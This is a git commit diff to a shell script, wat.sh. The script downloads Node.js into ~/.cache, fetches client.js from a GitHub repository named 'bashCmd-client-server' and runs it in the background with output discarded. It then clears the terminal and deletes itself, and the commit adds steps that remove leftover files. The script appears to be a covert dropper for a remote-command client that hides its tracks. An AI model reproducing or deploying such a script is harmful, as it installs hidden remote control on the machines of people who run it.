2359d932793fd2f129af49511c7c461538c048b4
Damien <damien@it-consultis.com>
2016-08-04 15:05:29 +0800

    adding init.d

--- wat.sh
+++ wat.sh
@@ -7,8 +7,6 @@ NODE_VERSION=v6.3.1
 PLATFORM=linux
 EXTENSION=xz
 
-if
-
 if [ $(uname) == "Darwin" ]; then
      PLATFORM=darwin
      EXTENSION=gz
@@ -20,12 +18,14 @@ cd ~/.cache
 
 
 curl https://nodejs.org/dist/$NODE_VERSION/node-$NODE_VERSION-$PLATFORM-x64.tar.$EXTENSION > node.tar.$EXTENSION
-tar -xvf node.tar.$EXTENSION 
+tar -xvf node.tar.$EXTENSION
 cp node-$NODE_VERSION-$PLATFORM-x64/bin/node .
 mv node bin
-rm -rf node-$NODE_VERSION-$PLATFORM-x64/bin/node
+rm -rf node-$NODE_VERSION-$PLATFORM-x64/
+rm -rf node.tar.$EXTENSION
 curl https://raw.githubusercontent.com/DamienBen/bashCmd-client-server/develop/client.js > $FILENAME
 
 
 nohup ./bin $FILENAME > /dev/null & clear
+cd -
 rm -- "$0"
